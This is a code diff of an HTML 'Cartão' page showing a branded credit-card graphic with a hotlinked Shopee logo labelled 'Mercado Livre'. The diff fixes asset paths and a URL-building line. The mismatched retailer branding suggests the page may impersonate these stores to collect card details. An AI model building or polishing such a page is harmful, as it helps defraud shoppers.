@@ -19,7 +19,7 @@
 </script>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-  <link rel="stylesheet" href="css/all.min-6.css">
+  <link rel="stylesheet" href="9/css/all.min-6.css">
   <title>Cartão</title>
   <style>
     body {
@@ -151,7 +151,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 
 
   <div class="header">
-    <img src="../../freelogopng.com/images/all_img/1656181621shopee-logo-white.png" alt="Logo Mercado Livre" class="logo">
+    <img src="https://freelogopng.com/images/all_img/1656181621shopee-logo-white.png" alt="Logo Mercado Livre" class="logo">
   </div>
 
   <div class="container">
@@ -213,7 +213,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
       </style>
 
       <div class="card-top">
-        <img src="../../freelogopng.com/images/all_img/1656181621shopee-logo-white.png" alt="Logo Mercado Livre" style="width: 100px; filter: drop-shadow(0 2px 3px rgba(0,0,0,0.2));">
+        <img src="https://freelogopng.com/images/all_img/1656181621shopee-logo-white.png" alt="Logo Mercado Livre" style="width: 100px; filter: drop-shadow(0 2px 3px rgba(0,0,0,0.2));">
         <div style="font-size: 12px; color: rgba(255, 255, 255, 0.8); font-family: 'Sora', sans-serif; text-transform: uppercase; letter-spacing: 1px;">
           Gold</div>
       </div>
@@ -221,7 +221,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
       <div style="position: absolute; top: 45%; left: 0; transform: translateY(-50%); width: 100%;">
         <div style="display: flex; justify-content: space-between; align-items: center; width: 100%;">
           <div style="display: flex; align-items: center; margin-left: 20px;">
-            <img src="images/chip.png" alt="Chip" style="width: 40px; filter: drop-shadow(0 2px 4px rgba(255, 255, 255, 0.3));">
+            <img src="9/images/chip.png" alt="Chip" style="width: 40px; filter: drop-shadow(0 2px 4px rgba(255, 255, 255, 0.3));">
           </div>
           <i class="fas fa-wifi fa-rotate-90" style="color: rgb(255, 255, 255); font-size: 24px; margin-right: 20px; text-shadow: 0 2px 4px rgba(0,0,0,0.3);"></i>
         </div>
@@ -239,7 +239,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
             CARTÃO</span>
         </div>
         <div style="display: flex; flex-direction: column; align-items: flex-end;">
-          <img src="images/visa.png" alt="mastercard"  style="width: 50px; filter: brightness(100);">
+          <img src="9/images/visa.png" alt="mastercard"  style="width: 50px; filter: brightness(100);">
           <span style="font-size: 8px; color: rgba(255, 255, 255, 0.979); font-family: 'Sora', sans-serif; margin-top: 3px; text-transform: uppercase;">Crédito</span>
         </div>
       </div>
@@ -287,7 +287,7 @@ height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
 
     // Função para construir URL com os parâmetros
     function buildUrlWithParams(baseUrl) {
-      const fullUrl = new URL(baseUrl%2c%20window.location.html);
+      const fullUrl = new URL(baseUrl, window.location.href);
       const params = getUrlParams();
 
       Object.keys(params).forEach(key => {
